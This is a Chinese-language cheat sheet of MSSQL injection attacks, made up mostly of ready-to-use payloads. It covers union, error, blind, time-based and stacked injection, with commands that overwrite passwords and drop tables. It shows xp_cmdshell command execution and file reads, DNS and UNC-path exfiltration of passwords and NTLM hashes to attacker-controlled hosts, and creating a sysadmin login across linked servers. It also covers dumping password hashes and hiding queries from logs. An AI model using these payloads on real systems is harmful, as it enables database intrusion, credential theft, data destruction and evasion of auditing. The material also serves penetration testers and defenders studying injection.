# MSSQL 注入

> MSSQL 注入是一种安全漏洞，当攻击者可以将恶意 SQL 代码插入或“注入”到由 Microsoft SQL Server (MSSQL) 数据库执行的查询中时，就会发生这种漏洞。这通常发生在未经过适当的清理或参数化，就将用户输入直接包含在 SQL 查询中时。SQL 注入可能导致严重后果，例如未经授权的数据访问、数据篡改，甚至获得对数据库服务器的控制权。

## 目录

- [MSSQL 默认数据库](#mssql-default-databases)
- [MSSQL 注释](#mssql-comments)
- [MSSQL 枚举](#mssql-enumeration)
    - [MSSQL 列出数据库](#mssql-list-databases)
    - [MSSQL 列出表](#mssql-list-tables)
    - [MSSQL 列出列](#mssql-list-columns)
- [MSSQL 基于联合查询 (Union Based)](#mssql-union-based)
- [MSSQL 基于报错 (Error Based)](#mssql-error-based)
- [MSSQL 基于盲注 (Blind Based)](#mssql-blind-based)
    - [MSSQL 使用等效子串的盲注](#mssql-blind-with-substring-equivalent)
- [MSSQL 基于时间 (Time Based)](#mssql-time-based)
- [MSSQL 堆叠查询 (Stacked Query)](#mssql-stacked-query)
- [MSSQL 文件操作](#mssql-file-manipulation)
    - [MSSQL 读取文件](#mssql-read-file)
    - [MSSQL 写入文件](#mssql-write-file)
- [MSSQL 命令执行](#mssql-command-execution)
    - [XP_CMDSHELL](#xp_cmdshell)
    - [Python 脚本](#python-script)
- [MSSQL 带外数据 (Out of Band)](#mssql-out-of-band)
    - [MSSQL DNS 数据外带](#mssql-dns-exfiltration)
    - [MSSQL UNC 路径](#mssql-unc-path)
- [MSSQL 信任链接 (Trusted Links)](#mssql-trusted-links)
- [MSSQL 权限](#mssql-privileges)
    - [MSSQL 列出权限](#mssql-list-permissions)
    - [MSSQL 将用户提升为 DBA](#mssql-make-user-dba)
- [MSSQL 数据库凭据](#mssql-database-credentials)
- [MSSQL 运行安全 (OPSEC)](#mssql-opsec)
- [参考资料](#references)

## MSSQL 默认数据库

| 名称                  | 描述                           |
|-----------------------|---------------------------------------|
| pubs                 | 在 MSSQL 2005 中不可用           |
| model                 | 在所有版本中可用             |
| msdb                 | 在所有版本中可用             |
| tempdb             | 在所有版本中可用             |
| northwind             | 在所有版本中可用             |
| information_schema | 从 MSSQL 2000 及更高版本可用  |

## MSSQL 注释

| 类型                       | 描述                       |
|----------------------------|-----------------------------------|
| `/* MSSQL Comment */`      | C 语言风格注释                   |
| `--`                       | SQL 注释                       |
| `;%00`                     | 空字节 (Null byte)                         |

## MSSQL 枚举

| 描述     | SQL 查询 |
| --------------- | ----------------------------------------- |
| DBMS 版本    | `SELECT @@version`                        |
| 数据库名称   | `SELECT DB_NAME()`                        |
| 数据库架构 (Schema) | `SELECT SCHEMA_NAME()`                    |
| 主机名        | `SELECT HOST_NAME()`                      |
| 主机名        | `SELECT @@hostname`                       |
| 主机名        | `SELECT @@SERVERNAME`                     |
| 主机名        | `SELECT SERVERPROPERTY('productversion')` |
| 主机名        | `SELECT SERVERPROPERTY('productlevel')`   |
| 主机名        | `SELECT SERVERPROPERTY('edition')`        |
| 用户            | `SELECT CURRENT_USER`                     |
| 用户            | `SELECT user_name();`                     |
| 用户            | `SELECT system_user;`                     |
| 用户            | `SELECT user;`                            |

### MSSQL 列出数据库

```sql
SELECT name FROM master..sysdatabases;
SELECT name FROM master.sys.databases;

-- 对于 N = 0, 1, 2, …
SELECT DB_NAME(N); 

-- 将分隔符值（如 ', '）更改为您想要的任何其他值 => master, tempdb, model, msdb 
-- (仅在 MSSQL 2017+ 中有效)
SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; 
```

### MSSQL 列出表

```sql
-- 使用 xtype = 'V' 获取视图
SELECT name FROM master..sysobjects WHERE xtype = 'U';
SELECT name FROM <DBNAME>..sysobjects WHERE xtype='U'
SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';

-- 列出 master..sometable 的列名和类型
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable';

SELECT table_catalog, table_name FROM information_schema.columns
SELECT table_name FROM information_schema.tables WHERE table_catalog='<DBNAME>'

-- 将分隔符值（如 ', '）更改为您想要的任何其他值 => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (仅在 MSSQL 2017+ 中有效)
SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U';
```

### MSSQL 列出列

```sql
-- 仅针对当前数据库
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable');

-- 列出 master..sometable 的列名和类型
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable'; 

SELECT table_catalog, column_name FROM information_schema.columns

SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)
```

## MSSQL 基于联合查询 (Union Based)

- 提取数据库名称

    ```sql
    $ SELECT name FROM master..sysdatabases
    [*] Injection
    [*] msdb
    [*] tempdb
    ```

- 从注入的数据库中提取表

    ```sql
    $ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
    [*] Profiles
    [*] Roles
    [*] Users
    ```

- 为 Users 表提取列

    ```sql
    $ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')
    [*] UserId
    [*] UserName
    ```

- 最后提取数据

    ```sql
    SELECT  UserId, UserName from Users
    ```

## MSSQL 基于报错 (Error Based)

| 名称         | 载荷 (Payload)         |
| ------------ | --------------- |
| CONVERT      | `AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -` |
| IN           | `AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -` |
| EQUAL        | `AND 1337=CONCAT('~',(SELECT @@version),'~') -- -` |
| CAST         | `CAST((SELECT @@version) AS INT)` |

- 针对整数型输入

    ```sql
    convert(int,@@version)
    cast((SELECT @@version) as int)
    ```

- 针对字符型输入

    ```sql
    ' + convert(int,@@version) + '
    ' + cast((SELECT @@version) as int) + '
    ```

## MSSQL 基于盲注 (Blind Based)

```sql
AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -
```

```sql
SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'
WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)
SELECT message FROM data WHERE row = 1 and message like 't%'
```

### MSSQL 使用等效子串的盲注

| 函数    | 示例                                         |
| ----------- | ----------------------------------------------- |
| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`        |

示例：

```sql
AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97
AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- 
AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'
AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90
```

## MSSQL 基于时间 (Time Based)

在基于时间的盲注攻击中，攻击者注入使用 `WAITFOR DELAY` 的载荷，使数据库暂停特定时间。然后，攻击者观察响应时间，以推断注入的载荷是否成功执行。

```sql
ProductID=1;waitfor delay '0:0:10'--
ProductID=1);waitfor delay '0:0:10'--
ProductID=1';waitfor delay '0:0:10'--
ProductID=1');waitfor delay '0:0:10'--
ProductID=1));waitfor delay '0:0:10'--
```

```sql
IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'
IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
```

## MSSQL 堆叠查询 (Stacked Query)

- 没有任何语句终止符的堆叠查询

    ```sql
    -- 多个 SELECT 语句
    SELECT 'A'SELECT 'B'SELECT 'C'

    -- 使用堆叠查询更新密码
    SELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')--

    -- 使用堆叠查询启用 xp_cmdshell
    -- 您将无法获得查询的输出，请将其重定向到文件 
    SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
    ```

- 使用分号 “`;`” 添加另一个查询

    ```sql
    ProductID=1; DROP members--
    ```

## MSSQL 文件操作

### MSSQL 读取文件

**权限**：`BULK` 选项需要 `ADMINISTER BULK OPERATIONS` 或 `ADMINISTER DATABASE BULK OPERATIONS` 权限。

```sql
OPENROWSET(BULK 'C:\path\to\file', SINGLE_CLOB)
```

示例：

```sql
-1 union select null,(select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),null,null
```

### MSSQL 写入文件

```sql
execute spWriteStringToFile 'contents', 'C:\path\to\', 'file'
```

## MSSQL 命令执行

### XP_CMDSHELL

`xp_cmdshell` 是 Microsoft SQL Server 中的一个系统存储过程，它允许您直接从 T-SQL (Transact-SQL) 中运行操作系统命令。

```sql
EXEC xp_cmdshell "net user";
EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
```

如果您需要重新激活 `xp_cmdshell`，它在 SQL Server 2005 中默认是禁用的。

```sql
-- 启用高级选项
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;

-- 启用 xp_cmdshell
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```

### Python 脚本

> 由不同于使用 `xp_cmdshell` 执行命令的用户所执行

```powershell
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
```

## MSSQL 带外数据 (Out of Band)

### MSSQL DNS 数据外带

技术来源于 [@ptswarm](https://twitter.com/ptswarm/status/1313476695295512578/photo/1)

- **权限**：需要服务器上的 `VIEW SERVER STATE` 权限。

    ```powershell
    1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))
    ```

- **权限**：需要 `CONTROL SERVER` 权限。

    ```powershell
    1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\',default,default)))
    1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.trc',default))
    ```

### MSSQL UNC 路径

MSSQL 支持堆叠查询，因此我们可以创建一个指向我们 IP 地址的变量，然后使用 `xp_dirtree` 函数列出我们 SMB 共享中的文件，并抓取 NTLMv2 哈希。

```sql
1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- 
```

```sql
xp_dirtree '\\attackerip\file'
xp_fileexist '\\attackerip\file'
BACKUP LOG [TESTING] TO DISK = '\\attackerip\file'
BACKUP DATABASE [TESTING] TO DISK = '\\attackeri\file'
RESTORE LOG [TESTING] FROM DISK = '\\attackerip\file'
RESTORE DATABASE [TESTING] FROM DISK = '\\attackerip\file'
RESTORE HEADERONLY FROM DISK = '\\attackerip\file'
RESTORE FILELISTONLY FROM DISK = '\\attackerip\file'
RESTORE LABELONLY FROM DISK = '\\attackerip\file'
RESTORE REWINDONLY FROM DISK = '\\attackerip\file'
RESTORE VERIFYONLY FROM DISK = '\\attackerip\file'
```

## MSSQL 信任链接 (Trusted Links)

Microsoft SQL Server 中的信任链接是一种链接服务器关系，它允许一个 SQL Server 实例在另一台服务器（或外部 OLE DB 数据源）上执行查询甚至远程过程，就好像远程服务器是本地环境的一部分一样。链接服务器公开了控制是否允许远程过程和 RPC 调用以及在远程服务器上使用何种安全上下文的选项。

> 数据库之间的链接甚至可以跨林信任 (forest trusts) 工作。

- 使用 `sysservers` 查找链接：对于 SQL Server 实例可以作为 OLE DB 数据源访问的每个服务器，包含一行记录。

    ```sql
    select * from master..sysservers
    ```

- 通过链接执行查询

    ```sql
    select * from openquery("dcorp-sql1", 'select * from master..sysservers')
    select version from openquery("linkedserver", 'select @@version as version')

    -- 链式调用多个 openquery
    select version from openquery("link1",'select version from openquery("link2","select @@version as version")')
    ```

- 执行 shell 命令

    ```sql
    -- 启用 xp_cmdshell 并执行 "dir" 命令
    EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
    select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')
    
    -- 创建一个 SQL 用户并赋予 sysadmin 权限
    EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMAIN\SERVER1"') AT "DOMAIN\SERVER2"
    EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMAIN\SERVER1"') AT "DOMAIN\SERVER2"
    ```

## MSSQL 权限

### MSSQL 列出权限

- 列出当前用户在服务器上的有效权限。

    ```sql
    SELECT * FROM fn_my_permissions(NULL, 'SERVER'); 
    ```

- 列出当前用户在数据库中的有效权限。

    ```sql
    SELECT * FROM fn_my_permissions (NULL, 'DATABASE');
    ```

- 列出当前用户在视图上的有效权限。

    ```sql
    SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name; 
    ```

- 检查当前用户是否是指定服务器角色的成员。

    ```sql
    -- 可能的角色：sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin
    SELECT is_srvrolemember('sysadmin');
    ```

### MSSQL 将用户提升为 DBA

```sql
EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
```

## MSSQL 数据库凭据

- **MSSQL 2000**: Hashcat 模式 131: `0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578`

    ```sql
    SELECT name, password FROM master..sysxlogins
    SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins 
    -- 需要转换为十六进制，以便在 MSSQL 错误消息 / 某些版本的查询分析器中返回哈希值
    ```

- **MSSQL 2005**: Hashcat 模式 132: `0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe`

    ```sql
    SELECT name, password_hash FROM master.sys.sql_logins
    SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
    ```

## MSSQL 运行安全 (OPSEC)

在查询中使用 `SP_PASSWORD` 以在日志中隐藏，例如：`' AND 1=1--sp_password`

```sql
-- 在此事件的文本中找到了 'sp_password'。
-- 出于安全原因，文本已替换为此注释。
```

